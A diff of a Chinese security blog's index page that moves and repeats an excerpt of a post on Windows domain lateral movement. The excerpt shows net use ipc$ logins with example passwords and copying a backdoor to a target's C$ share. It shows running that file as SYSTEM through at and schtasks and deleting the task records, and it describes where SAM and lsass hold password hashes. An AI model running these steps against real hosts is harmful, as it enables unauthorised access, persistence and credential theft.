@@ -134,6 +134,170 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/04/18/内网横向（一）/" >域内横向（一）</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-04-18  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="域内横向（一）"><a href="#域内横向（一）" class="headerlink" title="域内横向（一）"></a>域内横向（一）</h1><h2 id="Windos常用远程连接与命令"><a href="#Windos常用远程连接与命令" class="headerlink" title="Windos常用远程连接与命令"></a>Windos常用远程连接与命令</h2><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><ul>
+<li><p>与目标机器建立ipc$连接</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.12\ipc$ <span class="string">&quot;asd123qwe&quot;</span> /user:administrator</span><br></pre></td></tr></table></figure></li>
+<li><p>在被控主机查看建立的连接</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure></li>
+<li><p>删除ipc$连接</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.12\ipc$ /del /y</span><br></pre></td></tr></table></figure></li>
+<li><p>ipc$利用条件</p>
+<ol>
+<li>ipc$需要开启139,445端口</li>
+<li>管理员开启默认共享（对于逻辑盘的默认访问）</li>
+</ol>
+</li>
+<li><p>ipc$常见错误号</p>
+<ol>
+<li>5：拒绝访问</li>
+<li>51：Windows主机无法找到网络路径，中存在问题</li>
+<li>53：找不到网络路径，ip地址错误、目标未开机、目标的lanmanserver服务未启动、目标存在防火墙</li>
+<li>67：找不到网络名、lanmanserver服务未启动、ipc$已被删除</li>
+<li>1219：提供的凭据与已存在的凭据集冲突，请查看是否已经连接ipc$</li>
+<li>1326: 未知的用户名或密码错误</li>
+<li>1792：网络登录服务未启动、NetLogon服务未启动</li>
+<li>2242：用户密码已过期<h3 id="Windows自带工具获取远程主机信息（建立ipc-之后）"><a href="#Windows自带工具获取远程主机信息（建立ipc-之后）" class="headerlink" title="Windows自带工具获取远程主机信息（建立ipc$之后）"></a>Windows自带工具获取远程主机信息（建立ipc$之后）</h3></li>
+</ol>
+</li>
+<li><p>dir</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.1.10\c$       <span class="comment">#列出远程主机c盘下的文档</span></span><br></pre></td></tr></table></figure></li>
+<li><p>tasklist</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /S 192.168.1.10 /U Administrator /P asdqwe1123     <span class="comment">#列出远程主机上的进程</span></span><br></pre></td></tr></table></figure>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3></li>
+<li><p>at命令</p>
+<ol>
+<li>查看目标系统时间 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.1.10</span><br></pre></td></tr></table></figure></li>
+<li>将后门、payload…复制到目标系统中 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy cale.bat \\192.168.1.10\C$</span><br></pre></td></tr></table></figure></li>
+<li>使用at创建计划任务 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 5:00PM C:\cale.bat </span><br></pre></td></tr></table></figure></li>
+<li>清除at记录 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 7 /delete         <span class="comment">#7为任务ID</span></span><br></pre></td></tr></table></figure></li>
+<li>将执行结果写在本地 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 5:00AM cmd.exe /c <span class="string">&quot;ipconfig &gt;C:1.txt&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li>使用type读取远程主机文件 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> \\192.168.1.10\C$\1.txt</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>schtasks命令（由于在windows2008、Vista之后at命令被废弃，使用schtasks顶替）</p>
+<ul>
+<li>创建计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.1.10 /tn <span class="built_in">test</span> /sc onstart /tr c:\calc.bat /ru system /f     <span class="comment">#在主机上创建一个名为test的任务，在下次开机的时候已system的权限运行C盘下的calc.bat文件```</span></span><br></pre></td></tr></table></figure></li>
+<li>运行主机中的计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 192.168.1.10 /i /tn <span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li>如ipc$没有连接  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/u administrator    <span class="comment">#用户账号</span></span><br><span class="line">/p <span class="string">&quot;123asdqwe&quot;</span>      <span class="comment">#用户密码</span></span><br><span class="line">/f                  <span class="comment">#强制解除</span></span><br></pre></td></tr></table></figure></li>
+<li>删除计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 192.168.1.10 /tn <span class="string">&quot;test&quot;</span> /f</span><br></pre></td></tr></table></figure></li>
+<li>日志存储在<code>C:\Windows\Tasks\SchedLgU.txt</code>中</li>
+</ul>
+</li>
+</ul>
+<h2 id="Windows系统散列值获取"><a href="#Windows系统散列值获取" class="headerlink" title="Windows系统散列值获取"></a>Windows系统散列值获取</h2><h3 id="LM-Hash和NTLM-Hash"><a href="#LM-Hash和NTLM-Hash" class="headerlink" title="LM Hash和NTLM Hash"></a>LM Hash和NTLM Hash</h3><ul>
+<li><p>Windows操作系统中的密码由LM Hash和NTLM Hash组成</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:RID:LM-Hash:NTLM-Hash</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>LM Hash: 其本质为DES加密，Windows在版本Vista和2008之后就将其禁用。如在抓取之后LM-Hash值出现<code>aad3b435b51404eeaad3b435b51404ee</code>就表示LM-Hash被禁用</p>
+</li>
+<li><p>NTLM Hash: 其本质基于MD4加密算法进行加密个人版Vista和服务器版2003之后，Windows操作系统的认证方式采用NTLM Hash</p>
+</li>
+</ul>
+<h3 id="单机密码抓取"><a href="#单机密码抓取" class="headerlink" title="单机密码抓取"></a>单机密码抓取</h3><ul>
+<li>在Windows操作系统中抓取散列值或者明文密码，其权限必须为System，其本地用户的密码及其散列值都保存在SAM文件中。lsass.exe进程用于实现Windows的安全策略（本地安全策略和登录策略）。如此看来我们就可以使用工具在进程lsass.exe文件和SAM文件中导出密码和散列值。</li>
+</ul>
+<h4 id="读取SAM文件"><a href="#读取SAM文件" class="headerlink" title="读取SAM文件"></a>读取SAM文件</h4>
+	
+
+	</div>
+  <a type="button" href="/2021/04/18/内网横向（一）/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="域内横向（一）"><a href="#域内横向（一）" class="headerlink" title="域内横向（一）"></a>域内横向（一）</h1><h2 id="Windos常用远程连接与命令"><a href="#Windos常用远程连接与命令" class="headerlink" title="Windos常用远程连接与命令"></a>Windos常用远程连接与命令</h2><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><ul>
+<li><p>与目标机器建立ipc$连接</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.12\ipc$ <span class="string">&quot;asd123qwe&quot;</span> /user:administrator</span><br></pre></td></tr></table></figure></li>
+<li><p>在被控主机查看建立的连接</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure></li>
+<li><p>删除ipc$连接</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.12\ipc$ /del /y</span><br></pre></td></tr></table></figure></li>
+<li><p>ipc$利用条件</p>
+<ol>
+<li>ipc$需要开启139,445端口</li>
+<li>管理员开启默认共享（对于逻辑盘的默认访问）</li>
+</ol>
+</li>
+<li><p>ipc$常见错误号</p>
+<ol>
+<li>5：拒绝访问</li>
+<li>51：Windows主机无法找到网络路径，中存在问题</li>
+<li>53：找不到网络路径，ip地址错误、目标未开机、目标的lanmanserver服务未启动、目标存在防火墙</li>
+<li>67：找不到网络名、lanmanserver服务未启动、ipc$已被删除</li>
+<li>1219：提供的凭据与已存在的凭据集冲突，请查看是否已经连接ipc$</li>
+<li>1326: 未知的用户名或密码错误</li>
+<li>1792：网络登录服务未启动、NetLogon服务未启动</li>
+<li>2242：用户密码已过期<h3 id="Windows自带工具获取远程主机信息（建立ipc-之后）"><a href="#Windows自带工具获取远程主机信息（建立ipc-之后）" class="headerlink" title="Windows自带工具获取远程主机信息（建立ipc$之后）"></a>Windows自带工具获取远程主机信息（建立ipc$之后）</h3></li>
+</ol>
+</li>
+<li><p>dir</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.1.10\c$       <span class="comment">#列出远程主机c盘下的文档</span></span><br></pre></td></tr></table></figure></li>
+<li><p>tasklist</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /S 192.168.1.10 /U Administrator /P asdqwe1123     <span class="comment">#列出远程主机上的进程</span></span><br></pre></td></tr></table></figure>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3></li>
+<li><p>at命令</p>
+<ol>
+<li>查看目标系统时间 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.1.10</span><br></pre></td></tr></table></figure></li>
+<li>将后门、payload…复制到目标系统中 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy cale.bat \\192.168.1.10\C$</span><br></pre></td></tr></table></figure></li>
+<li>使用at创建计划任务 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 5:00PM C:\cale.bat </span><br></pre></td></tr></table></figure></li>
+<li>清除at记录 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 7 /delete         <span class="comment">#7为任务ID</span></span><br></pre></td></tr></table></figure></li>
+<li>将执行结果写在本地 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 5:00AM cmd.exe /c <span class="string">&quot;ipconfig &gt;C:1.txt&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li>使用type读取远程主机文件 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> \\192.168.1.10\C$\1.txt</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>schtasks命令（由于在windows2008、Vista之后at命令被废弃，使用schtasks顶替）</p>
+<ul>
+<li>创建计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.1.10 /tn <span class="built_in">test</span> /sc onstart /tr c:\calc.bat /ru system /f     <span class="comment">#在主机上创建一个名为test的任务，在下次开机的时候已system的权限运行C盘下的calc.bat文件```</span></span><br></pre></td></tr></table></figure></li>
+<li>运行主机中的计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 192.168.1.10 /i /tn <span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li>如ipc$没有连接  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/u administrator    <span class="comment">#用户账号</span></span><br><span class="line">/p <span class="string">&quot;123asdqwe&quot;</span>      <span class="comment">#用户密码</span></span><br><span class="line">/f                  <span class="comment">#强制解除</span></span><br></pre></td></tr></table></figure></li>
+<li>删除计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 192.168.1.10 /tn <span class="string">&quot;test&quot;</span> /f</span><br></pre></td></tr></table></figure></li>
+<li>日志存储在<code>C:\Windows\Tasks\SchedLgU.txt</code>中</li>
+</ul>
+</li>
+</ul>
+<h2 id="Windows系统散列值获取"><a href="#Windows系统散列值获取" class="headerlink" title="Windows系统散列值获取"></a>Windows系统散列值获取</h2><h3 id="LM-Hash和NTLM-Hash"><a href="#LM-Hash和NTLM-Hash" class="headerlink" title="LM Hash和NTLM Hash"></a>LM Hash和NTLM Hash</h3><ul>
+<li><p>Windows操作系统中的密码由LM Hash和NTLM Hash组成</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:RID:LM-Hash:NTLM-Hash</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>LM Hash: 其本质为DES加密，Windows在版本Vista和2008之后就将其禁用。如在抓取之后LM-Hash值出现<code>aad3b435b51404eeaad3b435b51404ee</code>就表示LM-Hash被禁用</p>
+</li>
+<li><p>NTLM Hash: 其本质基于MD4加密算法进行加密个人版Vista和服务器版2003之后，Windows操作系统的认证方式采用NTLM Hash</p>
+</li>
+</ul>
+<h3 id="单机密码抓取"><a href="#单机密码抓取" class="headerlink" title="单机密码抓取"></a>单机密码抓取</h3><ul>
+<li>在Windows操作系统中抓取散列值或者明文密码，其权限必须为System，其本地用户的密码及其散列值都保存在SAM文件中。lsass.exe进程用于实现Windows的安全策略（本地安全策略和登录策略）。如此看来我们就可以使用工具在进程lsass.exe文件和SAM文件中导出密码和散列值。</li>
+</ul>
+<h4 id="读取SAM文件"><a href="#读取SAM文件" class="headerlink" title="读取SAM文件"></a>读取SAM文件</h4>
+	
+	</div>
+  <a type="button" href="/2021/04/18/内网横向（一）/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/04/16/内网提权方法/" >Windows内网提权</a>
 		</h3>
 		</div>
@@ -312,170 +476,6 @@
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2021/04/16/内网横向（一）/" >域内横向（一）</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2021-04-16  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="域内横向（一）"><a href="#域内横向（一）" class="headerlink" title="域内横向（一）"></a>域内横向（一）</h1><h2 id="Windos常用远程连接与命令"><a href="#Windos常用远程连接与命令" class="headerlink" title="Windos常用远程连接与命令"></a>Windos常用远程连接与命令</h2><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><ul>
-<li><p>与目标机器建立ipc$连接</p>
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.12\ipc$ <span class="string">&quot;asd123qwe&quot;</span> /user:administrator</span><br></pre></td></tr></table></figure></li>
-<li><p>在被控主机查看建立的连接</p>
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure></li>
-<li><p>删除ipc$连接</p>
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.12\ipc$ /del /y</span><br></pre></td></tr></table></figure></li>
-<li><p>ipc$利用条件</p>
-<ol>
-<li>ipc$需要开启139,445端口</li>
-<li>管理员开启默认共享（对于逻辑盘的默认访问）</li>
-</ol>
-</li>
-<li><p>ipc$常见错误号</p>
-<ol>
-<li>5：拒绝访问</li>
-<li>51：Windows主机无法找到网络路径，中存在问题</li>
-<li>53：找不到网络路径，ip地址错误、目标未开机、目标的lanmanserver服务未启动、目标存在防火墙</li>
-<li>67：找不到网络名、lanmanserver服务未启动、ipc$已被删除</li>
-<li>1219：提供的凭据与已存在的凭据集冲突，请查看是否已经连接ipc$</li>
-<li>1326: 未知的用户名或密码错误</li>
-<li>1792：网络登录服务未启动、NetLogon服务未启动</li>
-<li>2242：用户密码已过期<h3 id="Windows自带工具获取远程主机信息（建立ipc-之后）"><a href="#Windows自带工具获取远程主机信息（建立ipc-之后）" class="headerlink" title="Windows自带工具获取远程主机信息（建立ipc$之后）"></a>Windows自带工具获取远程主机信息（建立ipc$之后）</h3></li>
-</ol>
-</li>
-<li><p>dir</p>
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.1.10\c$       <span class="comment">#列出远程主机c盘下的文档</span></span><br></pre></td></tr></table></figure></li>
-<li><p>tasklist</p>
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /S 192.168.1.10 /U Administrator /P asdqwe1123     <span class="comment">#列出远程主机上的进程</span></span><br></pre></td></tr></table></figure>
-<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3></li>
-<li><p>at命令</p>
-<ol>
-<li>查看目标系统时间 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.1.10</span><br></pre></td></tr></table></figure></li>
-<li>将后门、payload…复制到目标系统中 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy cale.bat \\192.168.1.10\C$</span><br></pre></td></tr></table></figure></li>
-<li>使用at创建计划任务 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 5:00PM C:\cale.bat </span><br></pre></td></tr></table></figure></li>
-<li>清除at记录 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 7 /delete         <span class="comment">#7为任务ID</span></span><br></pre></td></tr></table></figure></li>
-<li>将执行结果写在本地 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 5:00AM cmd.exe /c <span class="string">&quot;ipconfig &gt;C:1.txt&quot;</span></span><br></pre></td></tr></table></figure></li>
-<li>使用type读取远程主机文件 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> \\192.168.1.10\C$\1.txt</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li><p>schtasks命令（由于在windows2008、Vista之后at命令被废弃，使用schtasks顶替）</p>
-<ul>
-<li>创建计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.1.10 /tn <span class="built_in">test</span> /sc onstart /tr c:\calc.bat /ru system /f     <span class="comment">#在主机上创建一个名为test的任务，在下次开机的时候已system的权限运行C盘下的calc.bat文件```</span></span><br></pre></td></tr></table></figure></li>
-<li>运行主机中的计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 192.168.1.10 /i /tn <span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure></li>
-<li>如ipc$没有连接  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/u administrator    <span class="comment">#用户账号</span></span><br><span class="line">/p <span class="string">&quot;123asdqwe&quot;</span>      <span class="comment">#用户密码</span></span><br><span class="line">/f                  <span class="comment">#强制解除</span></span><br></pre></td></tr></table></figure></li>
-<li>删除计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 192.168.1.10 /tn <span class="string">&quot;test&quot;</span> /f</span><br></pre></td></tr></table></figure></li>
-<li>日志存储在<code>C:\Windows\Tasks\SchedLgU.txt</code>中</li>
-</ul>
-</li>
-</ul>
-<h2 id="Windows系统散列值获取"><a href="#Windows系统散列值获取" class="headerlink" title="Windows系统散列值获取"></a>Windows系统散列值获取</h2><h3 id="LM-Hash和NTLM-Hash"><a href="#LM-Hash和NTLM-Hash" class="headerlink" title="LM Hash和NTLM Hash"></a>LM Hash和NTLM Hash</h3><ul>
-<li><p>Windows操作系统中的密码由LM Hash和NTLM Hash组成</p>
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:RID:LM-Hash:NTLM-Hash</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>LM Hash: 其本质为DES加密，Windows在版本Vista和2008之后就将其禁用。如在抓取之后LM-Hash值出现<code>aad3b435b51404eeaad3b435b51404ee</code>就表示LM-Hash被禁用</p>
-</li>
-<li><p>NTLM Hash: 其本质基于MD4加密算法进行加密个人版Vista和服务器版2003之后，Windows操作系统的认证方式采用NTLM Hash</p>
-</li>
-</ul>
-<h3 id="单机密码抓取"><a href="#单机密码抓取" class="headerlink" title="单机密码抓取"></a>单机密码抓取</h3><ul>
-<li>在Windows操作系统中抓取散列值或者明文密码，其权限必须为System，其本地用户的密码及其散列值都保存在SAM文件中。lsass.exe进程用于实现Windows的安全策略（本地安全策略和登录策略）。如此看来我们就可以使用工具在进程lsass.exe文件和SAM文件中导出密码和散列值。</li>
-</ul>
-<h4 id="读取SAM文件"><a href="#读取SAM文件" class="headerlink" title="读取SAM文件"></a>读取SAM文件</h4>
-	
-
-	</div>
-  <a type="button" href="/2021/04/16/内网横向（一）/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="域内横向（一）"><a href="#域内横向（一）" class="headerlink" title="域内横向（一）"></a>域内横向（一）</h1><h2 id="Windos常用远程连接与命令"><a href="#Windos常用远程连接与命令" class="headerlink" title="Windos常用远程连接与命令"></a>Windos常用远程连接与命令</h2><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><ul>
-<li><p>与目标机器建立ipc$连接</p>
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.12\ipc$ <span class="string">&quot;asd123qwe&quot;</span> /user:administrator</span><br></pre></td></tr></table></figure></li>
-<li><p>在被控主机查看建立的连接</p>
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure></li>
-<li><p>删除ipc$连接</p>
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.12\ipc$ /del /y</span><br></pre></td></tr></table></figure></li>
-<li><p>ipc$利用条件</p>
-<ol>
-<li>ipc$需要开启139,445端口</li>
-<li>管理员开启默认共享（对于逻辑盘的默认访问）</li>
-</ol>
-</li>
-<li><p>ipc$常见错误号</p>
-<ol>
-<li>5：拒绝访问</li>
-<li>51：Windows主机无法找到网络路径，中存在问题</li>
-<li>53：找不到网络路径，ip地址错误、目标未开机、目标的lanmanserver服务未启动、目标存在防火墙</li>
-<li>67：找不到网络名、lanmanserver服务未启动、ipc$已被删除</li>
-<li>1219：提供的凭据与已存在的凭据集冲突，请查看是否已经连接ipc$</li>
-<li>1326: 未知的用户名或密码错误</li>
-<li>1792：网络登录服务未启动、NetLogon服务未启动</li>
-<li>2242：用户密码已过期<h3 id="Windows自带工具获取远程主机信息（建立ipc-之后）"><a href="#Windows自带工具获取远程主机信息（建立ipc-之后）" class="headerlink" title="Windows自带工具获取远程主机信息（建立ipc$之后）"></a>Windows自带工具获取远程主机信息（建立ipc$之后）</h3></li>
-</ol>
-</li>
-<li><p>dir</p>
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.1.10\c$       <span class="comment">#列出远程主机c盘下的文档</span></span><br></pre></td></tr></table></figure></li>
-<li><p>tasklist</p>
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /S 192.168.1.10 /U Administrator /P asdqwe1123     <span class="comment">#列出远程主机上的进程</span></span><br></pre></td></tr></table></figure>
-<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3></li>
-<li><p>at命令</p>
-<ol>
-<li>查看目标系统时间 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.1.10</span><br></pre></td></tr></table></figure></li>
-<li>将后门、payload…复制到目标系统中 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy cale.bat \\192.168.1.10\C$</span><br></pre></td></tr></table></figure></li>
-<li>使用at创建计划任务 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 5:00PM C:\cale.bat </span><br></pre></td></tr></table></figure></li>
-<li>清除at记录 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 7 /delete         <span class="comment">#7为任务ID</span></span><br></pre></td></tr></table></figure></li>
-<li>将执行结果写在本地 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 5:00AM cmd.exe /c <span class="string">&quot;ipconfig &gt;C:1.txt&quot;</span></span><br></pre></td></tr></table></figure></li>
-<li>使用type读取远程主机文件 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> \\192.168.1.10\C$\1.txt</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li><p>schtasks命令（由于在windows2008、Vista之后at命令被废弃，使用schtasks顶替）</p>
-<ul>
-<li>创建计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.1.10 /tn <span class="built_in">test</span> /sc onstart /tr c:\calc.bat /ru system /f     <span class="comment">#在主机上创建一个名为test的任务，在下次开机的时候已system的权限运行C盘下的calc.bat文件```</span></span><br></pre></td></tr></table></figure></li>
-<li>运行主机中的计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 192.168.1.10 /i /tn <span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure></li>
-<li>如ipc$没有连接  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/u administrator    <span class="comment">#用户账号</span></span><br><span class="line">/p <span class="string">&quot;123asdqwe&quot;</span>      <span class="comment">#用户密码</span></span><br><span class="line">/f                  <span class="comment">#强制解除</span></span><br></pre></td></tr></table></figure></li>
-<li>删除计划任务  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 192.168.1.10 /tn <span class="string">&quot;test&quot;</span> /f</span><br></pre></td></tr></table></figure></li>
-<li>日志存储在<code>C:\Windows\Tasks\SchedLgU.txt</code>中</li>
-</ul>
-</li>
-</ul>
-<h2 id="Windows系统散列值获取"><a href="#Windows系统散列值获取" class="headerlink" title="Windows系统散列值获取"></a>Windows系统散列值获取</h2><h3 id="LM-Hash和NTLM-Hash"><a href="#LM-Hash和NTLM-Hash" class="headerlink" title="LM Hash和NTLM Hash"></a>LM Hash和NTLM Hash</h3><ul>
-<li><p>Windows操作系统中的密码由LM Hash和NTLM Hash组成</p>
